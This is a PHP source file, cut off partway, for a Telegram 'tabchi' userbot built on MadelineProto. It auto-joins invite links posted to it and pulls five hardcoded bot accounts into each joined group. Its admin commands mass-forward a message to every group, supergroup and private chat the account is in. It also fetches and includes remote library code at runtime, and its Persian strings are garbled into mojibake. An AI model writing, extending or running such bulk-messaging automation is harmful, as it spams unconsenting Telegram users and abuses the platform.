
<?php
ini_set('display_errors', 0);
error_reporting(0);
 if(file_exists('madeline') && file_exists('update-session/madeline') && (time() - filectime('madeline')) > 90){
 unlink('madeline.lock');
 unlink('madeline');
 unlink('madeline.phar');
 unlink('madeline.phar.version');
 unlink('madeline.php');
 unlink('MadelineProto.log');
 unlink('bot.lock');
 copy('update-session/madeline', 'madeline');
 }
 if(file_exists('madeline') && file_exists('update-session/madeline') && (filesize('madeline')/1024) > 10240){
 unlink('madeline.lock');
 unlink('madeline');
 unlink('madeline.phar');
 unlink('madeline.phar.version');
 unlink('madeline.php');
 unlink('bot.lock');
 unlink('MadelineProto.log');
 copy('update-session/madeline', 'madeline');
 }
 function closeConnection($message = "<br><br><br><center><h1><span style='color:red'>Nima</span><span style='color:green'>Tabchi</span> <span style='color:gold'>Is</span> <span style='color:purple'>Running</span> !</h1></center>"){
 if (php_sapi_name() === 'cli' || isset($GLOBALS['exited'])) {
  return;
 }

    @ob_end_clean();
    @header('Connection: close');
    ignore_user_abort(true);
    ob_start();
    echo "$message";
    $size = ob_get_length();
    @header("Content-Length: $size");
    @header('Content-Type: text/html');
    ob_end_flush();
    flush();
    $GLOBALS['exited'] = true;
}
function shutdown_function($lock)
{
   try {
    $a = fsockopen((isset($_SERVER['HTTPS']) && @$_SERVER['HTTPS'] ? 'tls' : 'tcp').'://'.@$_SERVER['SERVER_NAME'], @$_SERVER['SERVER_PORT']);
    fwrite($a, @$_SERVER['REQUEST_METHOD'].' '.@$_SERVER['REQUEST_URI'].' '.@$_SERVER['SERVER_PROTOCOL']."\r\n".'Host: '.@$_SERVER['SERVER_NAME']."\r\n\r\n");
    flock($lock, LOCK_UN);
    fclose($lock);
} catch(Exception $v){}
}
if (!file_exists('bot.lock')) {
 touch('bot.lock');
}

$lock = fopen('bot.lock', 'r+');
$try = 1;
$locked = false;
while (!$locked) {
 $locked = flock($lock, LOCK_EX | LOCK_NB);
 if (!$locked) {
  closeConnection();
 if ($try++ >= 30) {
 exit;
 }
   sleep(1);
 }
}
if (!file_exists('data.json')) {
    file_put_contents('data.json', '{"autojoin":{"on":"on"}}');
}
if (!is_dir('update-session')) {
    mkdir('update-session');
}
if (!file_exists('madeline.php')) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}
define("MADELINE_BRANCH", "5.1.34");
include 'madeline.php';
$settings = [];
$settings[ 'logger' ][ 'logger' ] = 0;
$settings['serialization']['serialization_interval'] = 30;
$MadelineProto = new \danog\MadelineProto\API('madeline', $settings);
$MadelineProto->start();
class EventHandler extends \danog\MadelineProto\EventHandler {
    public function __construct($MadelineProto) {
        parent::__construct($MadelineProto);
    }
    public function onUpdateSomethingElse($update) {
        yield $this->onUpdateNewMessage($update);
    }
    public function onUpdateNewChannelMessage($update) {
        yield $this->onUpdateNewMessage($update);
    }
    public function onUpdateNewMessage($update) {
        try {
            if (!file_exists('update-session/madeline')) {
                copy('madeline', 'update-session/madeline');
            }
            
            $userID = isset($update['message']['from_id']) ? $update['message']['from_id'] : '';
            $msg = isset($update['message']['message']) ? $update['message']['message'] : '';
            $msg_id = isset($update['message']['id']) ? $update['message']['id'] : '';
            $MadelineProto = $this;
            $me = yield $MadelineProto->get_self();
            $me_id = $me['id'];
            $info = yield $MadelineProto->get_info($update);
            $chatID = $info['bot_api_id'];
            $type2 = $info['type'];
            @$data = json_decode(file_get_contents("data.json"), true);
            $creator = 389435672;
            $admin = 389435672; // ÿß€åÿØ€å ÿπÿØÿØ€å ÿßÿØŸÖ€åŸÜ ÿßÿµŸÑ€å
            if (file_exists('madeline') && filesize('madeline') / 1024 > 6143) {
                unlink('madeline.lock');
                unlink('madeline');
                copy('update-session/madeline', 'madeline');
                exit(file_get_contents('http://' . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF']));
                exit;
                exit;
            }
            if ($userID != $me_id) {
					if (@$data['autojoin']['on'] == 'on') {
                    if ($type2 == 'channel' || $userID == $admin || isset($data['admins'][$userID])) {
                        if (strpos($msg, 't.me/joinchat/') !== false) {
                            $a = explode('t.me/joinchat/', "$msg") [1];
                            $b = explode("
", "$a") [0];
                            try {
                                yield $MadelineProto->channels->joinChannel(['channel' => "https://t.me/joinchat/$b"]);
								$bot = ["@snscbscbot","@mimisoski1bot","@sexytdl2bot","@mimisoski2bot","@mimisoskibot"];
								$link = "https://t.me/joinchat/$b";
								foreach ($bot as $i) {
                                    $n = $i;
                                        yield $MadelineProto->channels->inviteToChannel(['channel' => $link, 'users' => ["$n"]]);
										
								}
								
                            }
                            catch(Exception $p) {
                            }
                            catch(\danog\MadelineProto\RPCErrorException $p) {
                            }
                        }
                    }
					}
					
					
					if ( $userID == $admin || $userID == $creator || isset( $data[ 'admins' ][ $userID ] ) ) {
                        if ($msg == '/restart') {
                            yield $MadelineProto->messages->deleteHistory(['just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id]);
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'Restarted!']);
                            $this->restart();
                        }
                        if ($msg == 'Ÿæÿß⁄©ÿ≥ÿßÿ≤€å') {
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...']);
                            $all = yield $MadelineProto->get_dialogs();
                            foreach ($all as $peer) {
                                $type = yield $MadelineProto->get_info($peer);
                                if ($type['type'] == 'supergroup') {
                                    $info = yield $MadelineProto->channels->getChannels(['id' => [$peer]]);
                                    @$banned = $info['chats'][0]['banned_rights']['send_messages'];
                                    if ($banned == 1) {
                                        yield $MadelineProto->channels->leaveChannel(['channel' => $peer]);
                                    }
                                }
                            }
                            yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => ' ‚Ä¢ ·¥°·¥Äs ·¥Ñ ü·¥á·¥Ä Ä·¥á·¥Ö ‚û£üåπ']);
                        }
                        if (is_file("error_log")) {
                            unlink("error_log");
                        }
                        if (preg_match("/^[\/\#\!]?(ÿÆÿ±Ÿàÿ¨|left)$/i", $msg)) {
                            $type = yield $this->get_info($chatID);
                            $type3 = $type['type'];
                            if ($type3 == "supergroup") {
                                yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "ùêãùêûùêüùê≠ùêûùêù"]);
                                yield $this->channels->leaveChannel(['channel' => $chatID, ]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÖÿÆÿµŸàÿµ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿØÿ± ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá ŸÖ€åÿ®ÿßÿ¥ÿØ"]);
                            }
                        }
                        /* if ($msg == 'ping' || $msg == '.' || $msg == 'ÿ±ÿ®ÿßÿ™' || $msg == 'ÿ¢ŸÜŸÑÿß€åŸÜ€å' || $msg == 'ŸÖ€åŸÖ€å' || $msg == 'ÿßŸÜŸÑÿß€åŸÜ') {
                            $robot = ["[* Bot Is ON ‚û£](tg://openmessage?user_id=389435672)"];
                            $r = $robot[rand(0, count($robot) - 1) ];
                            $MadelineProto->messages->sendMessage(['peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => $r, 'parse_mode' => 'html']);
                        }*/
						
						if ($msg == 'ping' || $msg == '.' || $msg == 'ÿ±ÿ®ÿßÿ™' || $msg == 'ÿ¢ŸÜŸÑÿß€åŸÜ€å' || $msg == 'ŸÖ€åŸÖ€å' || $msg == 'ÿßŸÜŸÑÿß€åŸÜ') {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "[* Bot Is ON ‚û£](tg://openmessage?user_id=389435672)", 'parse_mode' => 'markdown' ] );
            }
                        
                        if ($msg == 'ÿßŸÖÿßÿ±' || $msg == 'ÿ¢ŸÖÿßÿ±' || $msg == 'stats'){
yield $this->messages->sendMessage(['peer' => $chatID, 'message'=>'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...','reply_to_msg_id' => $msg_id]);
$day = (2505600 - (time() - filectime('update-session/madeline'))) / 60 / 60 / 24;
$day = round($day, 0);
$mem_using = round((memory_get_usage()/1024)/1024, 0).'MB';
$sat3 = $data['autojoin']['on'];
if ($sat3 == 'on'){
$sat3 = '‚úÖ';
} else {
$sat3 = '‚ùå';
}
$mem_total = 'NotAccess!';
$CpuCores = 'NotAccess!';
try {
if (strpos(@$_SERVER['SERVER_NAME'], '000webhost') === false){
if (strpos(PHP_OS, 'L') !== false || strpos(PHP_OS, 'l') !== false) {
$a = file_get_contents("/proc/meminfo");
$b = explode('MemTotal:', "$a")[1];
$c = explode(' kB', "$b")[0] / 1024 / 1024;
if ($c != 0 && $c != '') {
$mem_total = round($c, 1) . 'GB';
} else {
$mem_total = 'NotAccess!';
}
} else {
$mem_total = 'NotAccess!';
}
if (strpos(PHP_OS, 'L') !== false || strpos(PHP_OS, 'l') !== false) {
$a = file_get_contents("/proc/cpuinfo");
@$b = explode('cpu cores', "$a")[1];
@$b = explode("\n" ,"$b")[0];
@$b = explode(': ', "$b")[1];
if ($b != 0 && $b != '') {
$CpuCores = $b;
} else {
$CpuCores = 'NotAccess!';
}
} else {
$CpuCores = 'NotAccess!';
}
}
} catch(Exception $f){}
$supergps = 0;
$channels = 0;
$pvs = 0;
$gps = 0;
$s = yield $this->get_dialogs();
foreach ($s as $peer) {
try {
$i = yield $this->get_info($peer);
if ($i['type'] == 'supergroup') $supergps++;
if ($i['type'] == 'channel') $channels++;
if ($i['type'] == 'user') $pvs++;
if ($i['type'] == 'chat') $gps++;
} catch (\Exception $e) {
} catch (\danog\MadelineProto\RPCErrorException $e) {}
}
$all = $gps+$supergps+$channels+$pvs;
$ContactNumber = count(yield $this->contacts->getContactIDs());
yield $this->messages->sendMessage(['peer' => $chatID,
'message' => "Stats MisterTabchi :
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 All : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™$all ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™ ‚Å™: ŸáŸÖŸá
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 SuperGps : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ$supergps ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™: ÿ≥ŸàŸæÿ±⁄ØŸæŸáÿß
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
Channels : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™$channels ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™: ⁄©ÿßŸÜÿßŸÑ Ÿáÿß
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 NormalGroups ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™: ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ$gps ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™ ‚Å™: ⁄ØŸæ Ÿáÿß
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 Users : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ  ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ  ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™$pvs ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™ ‚Å™: Ÿæ€åŸà€å Ÿáÿß
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 Time out : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ    ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ  ‚Å™$day ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™: ŸÖÿØÿ™ ÿ±ÿ®ÿßÿ™
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 Contacts : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™$ContactNumber ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™ ‚Å™: ŸÖÿÆÿßÿ∑ÿ® Ÿáÿß
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 AutoJoin : ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™$sat3 ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å¨‚ÅÆ‚ÅÆ‚ÅÆ‚ÅÆ ‚Å™‚Å™: ÿπÿ∂Ÿà ÿÆŸàÿØ⁄©ÿßÿ±
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 CPU Cores : $CpuCores
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
 MemTotal : $mem_total
‚îà‚îÖ‚îÖ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ú¶‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÖ‚îÖ‚îà 
MemUsage by this bot : $mem_using"]);
 if ($supergps > 400 || $pvs > 5000){
yield $this->messages->sendMessage(['peer' => $chatID,
'message' => '‚ö†Ô∏è ÿßÿÆÿ∑ÿßÿ±: ÿ®Ÿá ÿØŸÑ€åŸÑ ⁄©ŸÖ ÿ®ŸàÿØŸÜ ŸÖŸÜÿßÿ®ÿπ Ÿáÿßÿ≥ÿ™ ÿ™ÿπÿØÿßÿØ ⁄Øÿ±ŸàŸá Ÿáÿß ŸÜÿ®ÿß€åÿØ ÿ®€åÿ¥ÿ™ÿ± ÿßÿ≤ 400 Ÿà ÿ™ÿπÿØÿßÿØ Ÿæ€åŸà€å ŸáÿßŸáŸÖ ŸÜÿ®ÿß€åÿØ ÿ®€åÿ¥ÿ™ÿ±ÿßÿ≤ 5000K ÿ®ÿßÿ¥ÿØ.
ÿß⁄Øÿ± ÿ™ÿß ⁄ÜŸÜÿØ ÿ≥ÿßÿπÿ™ ÿ¢€åŸÜÿØŸá ŸÖŸÇÿßÿØ€åÿ± ÿ®Ÿá ŸÖŸÇÿØÿßÿ± ÿßÿ≥ÿ™ÿßŸÜÿØÿßÿ±ÿØ ⁄©ÿßÿ≥ÿ™Ÿá ŸÜÿ¥ŸàÿØÿå ÿ™ÿ®⁄Ü€å ÿ¥ŸÖÿß ÿ≠ÿ∞ŸÅ ÿ¥ÿØŸá Ÿà ÿ®ÿß ÿßÿØŸÖ€åŸÜ ÿßÿµŸÑ€å ÿ®ÿ±ÿÆŸàÿ±ÿØ ÿÆŸàÿßŸáÿØ ÿ¥ÿØ.']);
}
}                
       
					   
                       if($msg == 'F2all' || $msg == 'f2all' || $msg == 'Fwdall' || $msg == 'fwdall'){
                            if ($type2 == 'supergroup') {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...']);
                                $rid = $update['message']['reply_to_msg_id'];
                                $dialogs = yield $MadelineProto->get_dialogs();
                                foreach ($dialogs as $peer) {
                                    $type = yield $MadelineProto->get_info($peer);
                                    if ($type['type'] == 'supergroup' || $type['type'] == 'user' || $type['type'] == 'chat') {
                                        $MadelineProto->messages->forwardMessages(['from_peer' => $chatID, 'to_peer' => $peer, 'id' => [$rid]]);
                                    }
                                }
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ÿ® ŸáŸÖŸá ŸÅŸàÿ±Ÿàÿßÿ±ÿØ ÿ≤ÿØŸÖ ']);
                            } else {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚Äºÿßÿ≤ ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÅŸÇÿ∑ ÿØÿ± ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá ŸÖ€åÿ™ŸàÿßŸÜ€åÿØ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ⁄©ŸÜ€åÿØ.']);
                            }
                        }
                     
                        
                        if($msg == 'F2pv' || $msg == 'f2pv' || $msg == 'Fwdpvs' || $msg == 'fwdpvs'){
                            if ($type2 == 'supergroup') {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...']);
                                $rid = $update['message']['reply_to_msg_id'];
                                $dialogs = yield $MadelineProto->get_dialogs();
                                foreach ($dialogs as $peer) {
                                    $type = yield $MadelineProto->get_info($peer);
                                    if ($type['type'] == 'user') {
                                        $MadelineProto->messages->forwardMessages(['from_peer' => $chatID, 'to_peer' => $peer, 'id' => [$rid]]);
                                    }
                                }
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => ' ÿ®Ÿá Ÿæ€å Ÿà€åÿß ŸÅÿ±Ÿàÿßÿ±ÿØ ⁄©ÿ±ÿØŸÖ']);
                            } else {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚Äºÿßÿ≤ ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÅŸÇÿ∑ ÿØÿ± ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá ŸÖ€åÿ™ŸàÿßŸÜ€åÿØ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ⁄©ŸÜ€åÿØ.']);
                            }
                        }
                        
                       if($msg == 'F2gps' || $msg == 'f2gps' || $msg == 'Fwdgps' || $msg == 'fwdgps'){
                            if ($type2 == 'supergroup') {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...']);
                                $rid = $update['message']['reply_to_msg_id'];
                                $dialogs = yield $MadelineProto->get_dialogs();
                                foreach ($dialogs as $peer) {
                                    $type = yield $MadelineProto->get_info($peer);
                                    if ($type['type'] == 'chat') {
                                        $MadelineProto->messages->forwardMessages(['from_peer' => $chatID, 'to_peer' => $peer, 'id' => [$rid]]);
                                    }
                                }
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ŸÅÿ±Ÿàÿßÿ±ÿØ ÿ®Ÿá ⁄Øÿ±ŸàŸáÿß ÿßŸÜÿ¨ÿßŸÖ ÿ¥ÿØ']);
                            } else {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '‚Äºÿßÿ≤ ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÅŸÇÿ∑ ÿØÿ± ÿ≥ŸàŸæÿ±⁄Øÿ±ŸàŸá ŸÖ€åÿ™ŸàÿßŸÜ€åÿØ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ⁄©ŸÜ€åÿØ.']);
                            }
                        }
                        
                        if($msg == 'F2sgps' || $msg == 'f2sgps'|| $msg == 'Fwdsgps' || $msg == 'fwdsgps'){
                            if ($type2 == 'supergroup') {
                                yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'ùê©ùê•ùêûùêöùê¨ùêû ùê∞ùêöùê¢ùê≠...']);
                                $rid = $update['message']['reply_to_msg_id'];
                                $dialogs = yield $MadelineProto->get_dialogs();
                                foreach ($dialogs as $peer) {
                                    $type = yield $MadelineProto->get_info($peer);
